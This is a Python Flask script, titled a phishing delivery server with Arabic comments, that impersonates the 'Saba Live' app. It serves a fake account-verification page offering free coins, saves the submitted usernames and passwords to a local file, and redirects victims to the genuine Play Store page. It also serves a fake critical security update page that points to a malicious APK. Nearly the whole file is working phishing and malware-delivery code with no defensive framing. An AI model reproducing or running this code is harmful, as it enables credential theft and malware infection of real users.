#!/usr/bin/env python3
# Phishing Delivery Server

from flask import Flask, request, render_template_string, redirect
import threading
import ssl

class PhishingServer:
    def __init__(self, port=443):
        self.port = port
        self.app = Flask(__name__)
        self.setup_routes()
        
    def setup_routes(self):
        """إعداد صفحات التصيد"""
        
        @self.app.route('/')
        def index():
            return self.generate_phishing_page()
            
        @self.app.route('/login', methods=['POST'])
        def login():
            # سرقة بيانات تسجيل الدخول
            username = request.form.get('username', '')
            password = request.form.get('password', '')
            
            # حفظ البيانات
            with open('logs/credentials.txt', 'a') as f:
                f.write(f"{username}:{password}\n")
                
            # توجيه إلى التطبيق الحقيقي
            return redirect('https://play.google.com/store/apps/details?id=com.saba.live')
            
        @self.app.route('/update')
        def update():
            """صفحة التحديث المزيفة"""
            return '''
            <!DOCTYPE html>
            <html>
            <head><title>Saba Live Critical Update</title></head>
            <body>
                <h1>Critical Security Update Required</h1>
                <p>Your version of Saba Live has security vulnerabilities.</p>
                <p>Click below to install the security patch:</p>
                <a href="/download_update">INSTALL UPDATE</a>
            </body>
            </html>
            '''
            
        @self.app.route('/download_update')
        def download_update():
            """تحميل APK خبيث"""
            return redirect('/malicious.apk')
            
    def generate_phishing_page(self):
        """توليد صفحة تصيد"""
        return '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Saba Live - Account Verification</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background: #1a1a1a;
                    color: white;
                    padding: 50px;
                }
                .login-box {
                    background: #2a2a2a;
                    padding: 30px;
                    border-radius: 10px;
                    width: 300px;
                    margin: 0 auto;
                }
                input {
                    width: 100%;
                    padding: 10px;
                    margin: 10px 0;
                    border: none;
                    border-radius: 5px;
                }
                button {
                    background: #4CAF50;
                    color: white;
                    padding: 15px;
                    border: none;
                    width: 100%;
                    border-radius: 5px;
                    cursor: pointer;
                }
            </style>
        </head>
        <body>
            <div class="login-box">
                <h2>Account Verification Required</h2>
                <p>Enter your credentials to continue using Saba Live:</p>
                <form action="/login" method="POST">
                    <input type="text" name="username" placeholder="Email or Phone" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">VERIFY ACCOUNT</button>
                </form>
                <p style="font-size: 12px; color: #888;">
                    By verifying, you agree to receive 10,000 free coins.
                </p>
            </div>
        </body>
        </html>
        '''
        
    def start(self):
        """بدء الخادم"""
        context = ssl.SSLContext(ssl.PROTOCOL_TLS)
        context.load_cert_chain('cert.pem', 'key.pem')
        
        self.app.run(
            host='0.0.0.0',
            port=self.port,
            ssl_context=context,
            debug=False,
            threaded=True
        )
